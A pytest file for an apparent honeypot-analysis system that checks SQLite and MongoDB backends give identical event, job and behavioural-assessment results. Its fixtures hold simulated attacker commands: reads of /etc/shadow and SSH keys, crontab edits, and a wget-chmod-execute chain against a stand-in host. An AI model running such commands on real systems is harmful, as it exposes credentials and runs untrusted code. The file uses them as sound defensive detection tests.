from __future__ import annotations

import hashlib
import os
from pathlib import Path

import pytest

from production.reporting.session_assessment_v4 import build_session_assessment_v4
from production.storage import CanonicalEventRecord, MongoDBStorageBackend, open_storage
from production.tools.mongodb_parity_receipt import build_parity_receipt, verify_parity_receipt, write_parity_receipt
from production.utils.serialization import stable_json
from tests.mongodb_test_support import cleanup_canonical_test_database, prepare_canonical_test_database


ROOT = Path(__file__).resolve().parents[1]
NOW = "2026-08-12T01:00:00.000000+00:00"


@pytest.fixture()
def parity_backends(tmp_path):
    uri = os.getenv("MONGODB_TEST_URI", "")
    if not uri: pytest.skip("MONGODB_TEST_URI is not configured for an isolated replica set")
    pymongo = pytest.importorskip("pymongo"); client = pymongo.MongoClient(uri, serverSelectionTimeoutMS=5_000)
    prepare_canonical_test_database(client)
    mongo = MongoDBStorageBackend(client=client); mongo.initialize()
    sqlite = open_storage(f"sqlite:///{tmp_path / 'parity.db'}")
    try: yield sqlite, mongo, client
    finally: cleanup_canonical_test_database(client); client.close()


def _digest(value) -> str:
    return hashlib.sha256(stable_json(value).encode()).hexdigest()


def test_canonical_runtime_parity_and_machine_receipt(parity_backends, tmp_path: Path) -> None:
    sqlite, mongo, client = parity_backends
    records = [
        CanonicalEventRecord.create("sensor-a", {"eventid": "cowrie.command.input", "session": "sensor-a:session-a", "input": command, "timestamp": "2026-08-12T00:00:00Z"}, received_at="2026-08-12T00:01:00Z")
        for command in ("id", "uname -a", "cat /etc/passwd")
    ]
    for record in reversed(records):
        sqlite.store_canonical_event(record); mongo.store_canonical_event(record)
    ordered = sorted(records, key=lambda item: item.event_id)
    cases = []
    sqlite_events, mongo_events = sqlite.fetch_events(), mongo.fetch_events()
    cases.append({"case_id": "event_order_and_equal_timestamp_tiebreak", "sqlite_sha256": _digest(sqlite_events), "mongodb_sha256": _digest(mongo_events), "matched": sqlite_events == mongo_events})
    sqlite_prefix = sqlite.load_session_event_snapshot("sensor-a:session-a", ordered[-1].event_id, 3)
    mongo_prefix = mongo.load_session_event_snapshot("sensor-a:session-a", ordered[-1].event_id, 3)
    cases.append({"case_id": "durable_prefix", "sqlite_sha256": _digest(sqlite_prefix), "mongodb_sha256": _digest(mongo_prefix), "matched": sqlite_prefix == mongo_prefix})
    session = {"session_id": "sensor-a:session-a", "src_ip": "192.0.2.10", "commands": ["id"]}
    sqlite.save_session(session); mongo.save_session(session)
    sqlite_session = sqlite.get_session(session["session_id"]); mongo_session = mongo.get_session(session["session_id"])
    comparable_sqlite = {key: sqlite_session[key] for key in ("session_id", "revision", "payload_json")}
    comparable_mongo = {key: mongo_session[key] for key in ("session_id", "revision", "payload_json")}
    cases.append({"case_id": "session_revision_payload", "sqlite_sha256": _digest(comparable_sqlite), "mongodb_sha256": _digest(comparable_mongo), "matched": comparable_sqlite == comparable_mongo})
    sqlite_job = sqlite.enqueue_analysis_job(session); mongo_job = mongo.enqueue_analysis_job(session)
    assert sqlite_job == mongo_job
    sqlite_claim = sqlite.claim_analysis_jobs("worker-a", 1, 30, 3, now=NOW)[0]
    mongo_claim = mongo.claim_analysis_jobs("worker-a", 1, 30, 3, now=NOW)[0]
    report = {"schema_version": "legacy-report.v1", "session_id": session["session_id"], "findings": []}
    sqlite_report = sqlite.complete_analysis_job(sqlite_job, "worker-a", sqlite_claim["claim_token"], report, now="2026-08-12T01:00:01Z")
    mongo_report = mongo.complete_analysis_job(mongo_job, "worker-a", mongo_claim["claim_token"], report, now="2026-08-12T01:00:01Z")
    cases.append({"case_id": "analysis_report_identity", "sqlite_sha256": _digest(sqlite_report), "mongodb_sha256": _digest(mongo_report), "matched": sqlite_report == mongo_report})
    version = client.server_info()["version"]
    receipt = build_parity_receipt(cases, source_revision="7194c0b4091c5acd234708b494f400cd901fcdc7", mongodb_version=version, manifest_sha256=mongo.manifest.sha256)
    assert receipt["all_matched"] is True
    path = tmp_path / "SQLITE_MONGODB_PARITY_RECEIPT.json"
    digest = write_parity_receipt(path, receipt)
    assert len(digest) == 64
    assert verify_parity_receipt(path) == receipt


def test_event_retry_and_completion_state_is_backend_identical(parity_backends) -> None:
    sqlite, mongo, _client = parity_backends
    record = CanonicalEventRecord.create(
        "sensor-a",
        {
            "eventid": "cowrie.command.input",
            "session": "sensor-a:event-lifecycle",
            "input": "id",
        },
        received_at="2026-08-12T00:00:00Z",
    )
    sqlite.store_canonical_event(record)
    mongo.store_canonical_event(record)
    left = sqlite.claim_events("worker-a", 1, 30, 3, now=NOW)[0]
    right = mongo.claim_events("worker-a", 1, 30, 3, now=NOW)[0]
    for field in ("event_id", "sensor_id", "payload_json", "attempts", "claim_expires_at"):
        assert left[field] == right[field]
    assert sqlite.fail_event(
        record.event_id,
        "worker-a",
        left["claim_token"],
        "temporary_failure",
        "TimeoutError",
        True,
        3,
        0,
        now=NOW,
    ) == mongo.fail_event(
        record.event_id,
        "worker-a",
        right["claim_token"],
        "temporary_failure",
        "TimeoutError",
        True,
        3,
        0,
        now=NOW,
    ) == "retry_scheduled"
    left = sqlite.claim_events("worker-b", 1, 30, 3, now=NOW)[0]
    right = mongo.claim_events("worker-b", 1, 30, 3, now=NOW)[0]
    assert left["event_id"] == right["event_id"] == record.event_id
    assert left["attempts"] == right["attempts"] == 2
    assert sqlite.complete_event(
        record.event_id, "worker-b", left["claim_token"], now=NOW
    )
    assert mongo.complete_event(
        record.event_id, "worker-b", right["claim_token"], now=NOW
    )
    assert sqlite.get_event(record.event_id)["processed"] is True
    assert mongo.get_event(record.event_id)["processed"] is True


def test_cross_domain_application_identities_are_backend_identical(
    parity_backends,
) -> None:
    sqlite, mongo, _client = parity_backends
    session_id = "sensor-a:identity-parity"
    session = {
        "session_id": session_id,
        "src_ip": "192.0.2.10",
        "session_source": "production_live",
    }
    sqlite.save_session(session)
    mongo.save_session(session)

    enrichment_left = sqlite.enqueue_enrichment_job(
        "ip", "192.0.2.10", session_id, payload={"source": "fixture"}
    )
    enrichment_right = mongo.enqueue_enrichment_job(
        "ip", "192.0.2.10", session_id, payload={"source": "fixture"}
    )
    assert enrichment_left == enrichment_right

    hunt_left = sqlite.enqueue_threat_hunt_job(
        session_id, "ip", "192.0.2.10", "fixture"
    )
    hunt_right = mongo.enqueue_threat_hunt_job(
        session_id, "ip", "192.0.2.10", "fixture"
    )
    assert hunt_left == hunt_right

    sighting = {
        "sighting_id": "sighting-parity",
        "observable_type": "ip",
        "observable_value": "192.0.2.10",
        "session_id": session_id,
        "event_id": "event-parity",
        "timestamp": "2026-08-12T00:00:00Z",
        "source": "fixture",
    }
    assert sqlite.record_observable_sighting(sighting) == mongo.record_observable_sighting(
        sighting
    )

    task = {
        "event_id": "event-parity",
        "session_id": session_id,
        "prediction_mode": "transformer_poc",
    }
    assert sqlite.enqueue_prediction_outbox(task) == mongo.enqueue_prediction_outbox(task)

    campaign = {"campaign_id": "campaign-parity", "hassh_fingerprint": "hash-a"}
    assert sqlite.save_campaign(campaign) == mongo.save_campaign(campaign)
    assert sqlite.link_campaign_session(
        "campaign-parity", session_id, ["hassh"], 1.0
    )[0] == mongo.link_campaign_session(
        "campaign-parity", session_id, ["hassh"], 1.0
    )[0]

    lifecycle = {
        "policy_id": "retention",
        "policy_version": "v1",
        "policy_sha256": "a" * 64,
        "effective_path": "configs/data_lifecycle_policy.v1.json",
        "activated_at": "2026-08-12T00:00:00Z",
    }
    assert sqlite.record_data_lifecycle_policy(**lifecycle) is True
    assert mongo.record_data_lifecycle_policy(**lifecycle) is True
    assert sqlite.record_data_lifecycle_policy(**lifecycle) is False
    assert mongo.record_data_lifecycle_policy(**lifecycle) is False


def test_behavioral_assessment_is_identical_from_each_durable_prefix(parity_backends, monkeypatch) -> None:
    sqlite, mongo, _client = parity_backends
    commands = ["whoami", "id", "uname -a", "cat /etc/passwd", "cat /etc/shadow", "wget http://example.invalid/a -O /tmp/a", "chmod +x /tmp/a", "/tmp/a", "crontab -l", "crontab -e", "cat ~/.ssh/authorized_keys"]
    records = []
    for index, command in enumerate(commands):
        event = {"eventid": "cowrie.command.input", "session": "sensor-a:behavior", "src_ip": "192.0.2.10", "timestamp": f"2026-08-12T00:{index:02d}:00Z", "input": command, "success": 1}
        record = CanonicalEventRecord.create("sensor-a", event, received_at=f"2026-08-12T01:{index:02d}:00Z")
        records.append(record); sqlite.store_canonical_event(record); mongo.store_canonical_event(record)
    left = sqlite.load_session_event_snapshot("sensor-a:behavior", records[-1].event_id, len(records))
    right = mongo.load_session_event_snapshot("sensor-a:behavior", records[-1].event_id, len(records))
    assert left == right
    monkeypatch.setattr("production.reporting.session_assessment_v4.utc_now", lambda: "2026-08-12T02:00:00+00:00")
    def assess(events):
        session = {"session_id": "sensor-a:behavior", "src_ip": "192.0.2.10", "commands": commands, "commands_success": commands, "classification_events": [], "raw_events": events}
        return build_session_assessment_v4([session], raw_events=events, behavior_policy_path=str(ROOT / "configs/threat_hypothesis_behavior.trusted.json"), classification_policy_path=str(ROOT / "configs/classification_rules.trusted.json"))
    sqlite_report, mongo_report = assess(left["events"]), assess(right["events"])
    assert sqlite_report["assessment_id"] == mongo_report["assessment_id"]
    for field in (
        "canonical_evidence",
        "behavioral_findings",
        "hypothesis_sets",
        "authority",
    ):
        assert stable_json(sqlite_report.get(field)) == stable_json(mongo_report.get(field))
    sqlite_guidance = dict(sqlite_report["response_guidance_v3"])
    mongo_guidance = dict(mongo_report["response_guidance_v3"])
    assert sqlite_guidance.pop("generated_at")
    assert mongo_guidance.pop("generated_at")
    assert stable_json(sqlite_guidance) == stable_json(mongo_guidance)
    coverage = sqlite_report["canonical_evidence"]["semantic_coverage"]
    assert coverage["coverage_status"] == "full"
    assert coverage["typed_analyzed_count"] == len(commands)
    finding_types = {
        item["finding_type"] for item in sqlite_report["behavioral_findings"]
    }
    assert "connected_transfer_permission_execution" in finding_types
    assert sqlite_report["response_guidance_v3"]["safety"]["automatic_execution"] is False
    assert sqlite_report["authority"]["predictions_authoritative"] is False


@pytest.mark.parametrize(
    ("case_id", "commands", "forbidden_finding"),
    [
        (
            "incomplete_transfer",
            ["wget http://example.invalid/a -O /tmp/a"],
            "connected_transfer_permission_execution",
        ),
        (
            "mismatched_paths",
            [
                "wget http://example.invalid/a -O /tmp/a",
                "chmod +x /tmp/b",
                "/tmp/c",
            ],
            "connected_transfer_permission_execution",
        ),
        (
            "parser_abstention",
            ["$CMD /etc/shadow"],
            "observed_credential_path_read_command",
        ),
    ],
)
def test_behavioral_abstention_and_chain_edge_cases_are_backend_identical(
    parity_backends,
    monkeypatch,
    case_id: str,
    commands: list[str],
    forbidden_finding: str,
) -> None:
    sqlite, mongo, _client = parity_backends
    records = []
    session_id = f"sensor-a:{case_id}"
    for index, command in enumerate(commands):
        event = {
            "eventid": "cowrie.command.input",
            "session": session_id,
            "src_ip": "192.0.2.10",
            "timestamp": f"2026-08-12T00:{index:02d}:00Z",
            "input": command,
            "success": 1,
        }
        record = CanonicalEventRecord.create(
            "sensor-a", event, received_at=f"2026-08-12T01:{index:02d}:00Z"
        )
        records.append(record)
        sqlite.store_canonical_event(record)
        mongo.store_canonical_event(record)
    left = sqlite.load_session_event_snapshot(
        session_id, records[-1].event_id, len(records)
    )
    right = mongo.load_session_event_snapshot(
        session_id, records[-1].event_id, len(records)
    )
    assert left == right
    monkeypatch.setattr(
        "production.reporting.session_assessment_v4.utc_now",
        lambda: "2026-08-12T02:00:00+00:00",
    )

    def assess(events):
        session = {
            "session_id": session_id,
            "src_ip": "192.0.2.10",
            "commands": commands,
            "commands_success": commands,
            "classification_events": [],
            "raw_events": events,
        }
        return build_session_assessment_v4(
            [session],
            raw_events=events,
            behavior_policy_path=str(
                ROOT / "configs/threat_hypothesis_behavior.trusted.json"
            ),
            classification_policy_path=str(
                ROOT / "configs/classification_rules.trusted.json"
            ),
        )

    sqlite_report = assess(left["events"])
    mongo_report = assess(right["events"])
    assert sqlite_report["assessment_id"] == mongo_report["assessment_id"]
    assert stable_json(sqlite_report["canonical_evidence"]) == stable_json(
        mongo_report["canonical_evidence"]
    )
    assert stable_json(sqlite_report["behavioral_findings"]) == stable_json(
        mongo_report["behavioral_findings"]
    )
    assert forbidden_finding not in {
        item["finding_type"] for item in sqlite_report["behavioral_findings"]
    }
